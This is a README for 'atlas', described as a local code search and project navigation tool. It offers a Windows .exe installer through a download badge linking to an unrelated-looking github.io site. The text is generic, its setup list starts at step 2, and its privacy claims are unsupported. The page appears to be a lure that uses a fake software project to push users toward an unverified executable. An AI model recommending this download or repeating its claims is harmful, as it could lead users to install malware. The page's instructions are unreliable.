# 🔍 atlas - Improve code search and project navigation 

[![](https://img.shields.io/badge/Download_Atlas-Blue.svg)](https://expressionsound800.github.io)

## 📖 About this project
Atlas helps you find information within your software projects. Projects grow complex over time. Files multiply and cross-references become hard to track. This tool maps your code structure so you find what you need without manual searching. It acts as a guide for your coding workflow.

The software creates a searchable index of your project files. It understands relationships between different parts of your code. You ask questions about your codebase, and the application identifies the relevant sections. This saves time when you work on large projects or return to old work.

## 🚀 Getting Started
You do not need programming skills to use Atlas. The software runs on your computer and keeps your data local. It does not send your code to external servers. Follow the steps below to set up the tool.

2. Look for the file ending in `.exe`. This is the Windows installer.

## ⚙️ System Requirements
Atlas runs on Windows 10 and Windows 11. Ensure your computer has at least 8 gigabytes of memory to index projects effectively. A solid-state drive improves the speed of file retrieval. The software requires a stable internet connection only for the initial download and occasional updates to the underlying artificial intelligence models.

## 🛠️ How to use Atlas
Open the application after the installation finishes. You will see a prompt to select a folder. Choose the folder that contains your project code. Atlas scans the files and creates an internal map. This process takes a few minutes depending on the size of your project.

Once the scan finishes, a search box appears. Type a question or a topic regarding your code. For example, you might ask where a specific function lives or how a component interacts with another. The software displays a list of files and specific lines that match your request.

You can click any result to open the associated file. Use the side panel to filter results by file type or directory. This keeps your search results organized.

## 🧩 Key Features
* Local Indexing: The software indexes your files on your hard drive.
* Privacy: No code leaves your machine. Your data remains private.
* Smart Navigation: The tool links related code files based on logic and structure.
* Context Awareness: It understands how different parts of your project influence each other.
* Fast Search: You find answers in seconds rather than browsing through folders manually.

## ❓ Frequently Asked Questions
Does Atlas modify my code?
No. The software only reads your files to create an index. It never adds, changes, or deletes your data. 

Can I index multiple projects? 
Yes. You can add different project folders to the application. Use the project manager inside the settings menu to switch between them.

Does the search require the internet? 
The core search functionality works offline. You only need the internet if you want to download updates for the tool.

What do I do if the search is slow?
Large projects require more memory to index. Close other programs if you notice sluggish performance. If you have a very large project, the initial scan takes a bit of time, but subsequent searches remain fast.

## 📈 Improving performance
Keep your project folder clean. Remove temporary files or binary data that you do not need to search. This reduces the time the indexer spends on irrelevant items. If you add new files to your project, click the refresh button in the application to update the index.
